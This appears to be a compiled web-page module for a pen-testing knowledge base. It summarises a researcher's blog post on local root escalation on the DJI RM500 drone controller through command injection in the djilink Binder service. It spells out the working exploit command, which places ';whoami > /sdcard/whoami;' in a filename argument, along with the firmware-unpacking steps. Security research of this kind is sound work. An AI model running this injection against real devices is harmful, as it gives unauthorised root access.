import{_ as e,o as a,c as t,ag as s}from"./chunks/framework.DXGyWiRo.js";const p=JSON.parse('{"title":"Local privilege escalation on DJI RM500 (djilink / Binder)","description":"Imported note from https://icanhack.nl/blog/dji-rm500-privilege-escalation/","frontmatter":{"title":"Local privilege escalation on DJI RM500 (djilink / Binder)","description":"Imported note from https://icanhack.nl/blog/dji-rm500-privilege-escalation/"},"headers":[],"relativePath":"pen-testing/drones/icanhack-dji-rm500-privilege-escalation.md","filePath":"pen-testing/drones/icanhack-dji-rm500-privilege-escalation.md"}'),n={name:"pen-testing/drones/icanhack-dji-rm500-privilege-escalation.md"};function o(r,i,l,d,c,h){return a(),t("div",null,[...i[0]||(i[0]=[s('<h1 id="local-privilege-escalation-on-dji-rm500-djilink-binder" tabindex="-1">Local privilege escalation on DJI RM500 (djilink / Binder) <a class="header-anchor" href="#local-privilege-escalation-on-dji-rm500-djilink-binder" aria-label="Permalink to &quot;Local privilege escalation on DJI RM500 (djilink / Binder)&quot;">​</a></h1><h2 id="source" tabindex="-1">Source <a class="header-anchor" href="#source" aria-label="Permalink to &quot;Source&quot;">​</a></h2><ul><li>Type: webpage</li><li>Origin: <a href="https://icanhack.nl/blog/dji-rm500-privilege-escalation/" target="_blank" rel="noreferrer">https://icanhack.nl/blog/dji-rm500-privilege-escalation/</a></li><li>Imported: 2026-04-21</li></ul><h2 id="content" tabindex="-1">Content <a class="header-anchor" href="#content" aria-label="Permalink to &quot;Content&quot;">​</a></h2><p>Blog by <strong>Willem Melching</strong> (Aug 6, 2023): escalating from default ADB <code>shell</code> to <strong><code>root</code></strong> on the <strong>DJI RM500</strong> smart controller (Android <strong>7.1.2</strong>, Linux <strong>4.4.83</strong>, <strong>Rockchip RK3399</strong>). Motivation in the post: bring up a USB–Ethernet adapter (<code>ifconfig eth0 up</code>) which requires root.</p><h3 id="preconditions-as-stated" tabindex="-1">Preconditions (as stated) <a class="header-anchor" href="#preconditions-as-stated" aria-label="Permalink to &quot;Preconditions (as stated)&quot;">​</a></h3><ul><li>Physical USB access to the remote.</li><li>First ADB connection requires accepting the on-device authorization prompt.</li></ul><h3 id="attack-surface-triage" tabindex="-1">Attack surface triage <a class="header-anchor" href="#attack-surface-triage" aria-label="Permalink to &quot;Attack surface triage&quot;">​</a></h3><ul><li><strong><code>netstat -tulpn</code>:</strong> listeners in <code>4000X</code> range; process ownership hidden without root.</li><li><strong><code>ps</code>:</strong> <code>/system/bin/djilink</code> and <code>/system/bin/dji_wms</code> run as <strong>root</strong>.</li><li><strong><code>service list | grep -i dji</code>:</strong> Binder services including <strong><code>djilink</code></strong> (<code>djilink: [djilink]</code>).</li></ul><h3 id="obtaining-filesystem-binary-for-analysis" tabindex="-1">Obtaining filesystem / binary for analysis <a class="header-anchor" href="#obtaining-filesystem-binary-for-analysis" aria-label="Permalink to &quot;Obtaining filesystem / binary for analysis&quot;">​</a></h3><ul><li>Full OS update tarball available (example path in post): DankDroneDownloader → <code>V01.01.0072_rm500_dji_system.bin</code> (actually a <strong>tar</strong>).</li><li>Large <code>.pro.fw.sig</code> payload: ZIP after <strong>480-byte</strong> DJI-style header; <code>unzip</code> tolerates leading bytes.</li><li><code>system.new.dat</code> + <code>system.transfer.list</code> → reconstruct ext4 with <strong><a href="https://github.com/xpirt/sdat2img" target="_blank" rel="noreferrer">sdat2img</a></strong>, then mount <code>system.img</code> and extract <code>/bin/djilink</code>.</li></ul><h3 id="ghidra-system-review" tabindex="-1">Ghidra / <code>system()</code> review <a class="header-anchor" href="#ghidra-system-review" aria-label="Permalink to &quot;Ghidra / `system()` review&quot;">​</a></h3><ul><li>Many <code>system()</code> call sites; author focuses on factory-test style code.</li><li>Vulnerable pattern: <strong><code>tinycap</code></strong> invoked via <code>system()</code> with a <strong>user-controlled filename string</strong> concatenated into the shell command without sanitization → <strong>command injection</strong> via <code>;</code>.</li></ul><h3 id="binder-invocation" tabindex="-1">Binder invocation <a class="header-anchor" href="#binder-invocation" aria-label="Permalink to &quot;Binder invocation&quot;">​</a></h3><ul><li>Helper <strong><code>libdjilink.so</code></strong>: <code>BpLinkService::setMicStatus</code> packages <strong>4× int32</strong> + <strong>String16</strong> and calls transaction <strong>1030</strong> (<code>0x406</code>).</li><li>Working start example from post:</li></ul><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">service</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> call</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> djilink</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1030</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> i32</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> i32</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> i32</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> i32</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> s16</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;/sdcard/test.wav&quot;</span></span></code></pre></div><h3 id="exploit-command-injection-in-filename" tabindex="-1">Exploit command (injection in filename) <a class="header-anchor" href="#exploit-command-injection-in-filename" aria-label="Permalink to &quot;Exploit command (injection in filename)&quot;">​</a></h3><ul><li>Format string described: <code>tinycap %s -D 0 -d 0 -i %d -c %d -r 48000 -b 16 -t %d</code> with <strong>128-char</strong> total budget mentioned.</li><li>Example payload:</li></ul><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">service</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> call</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> djilink</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1030</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> i32</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> i32</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> i32</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 2</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> i32</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> s16</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;;whoami &gt; /sdcard/whoami;&quot;</span></span></code></pre></div><ul><li>Verified effect in post: <code>/sdcard/whoami</code> contains <strong><code>root</code></strong>.</li></ul><h3 id="impact-and-disclosure-context-author-s-framing" tabindex="-1">Impact and disclosure context (author’s framing) <a class="header-anchor" href="#impact-and-disclosure-context-author-s-framing" aria-label="Permalink to &quot;Impact and disclosure context (author’s framing)&quot;">​</a></h3><ul><li><strong>Local</strong> privilege escalation: needs physical access + ADB pairing acceptance.</li><li>RM500 discontinued; author notes <strong>out of scope</strong> for DJI bug bounty and discusses disclosure constraints.</li></ul><h2 id="key-takeaways" tabindex="-1">Key Takeaways <a class="header-anchor" href="#key-takeaways" aria-label="Permalink to &quot;Key Takeaways&quot;">​</a></h2><ul><li>Root-running <strong><code>djilink</code></strong> + Binder exposes high-value IPC; factory-test code paths are a classic weak spot.</li><li><strong><code>system()</code></strong> with attacker-influenced strings is sufficient for <strong><code>;</code></strong>-style shell injection even under tight length limits.</li><li>Firmware packages can be unpacked offline to enable static analysis of privileged daemons without a rooted device first.</li></ul>',24)])])}const k=e(n,[["render",o]]);export{p as __pageData,k as default};
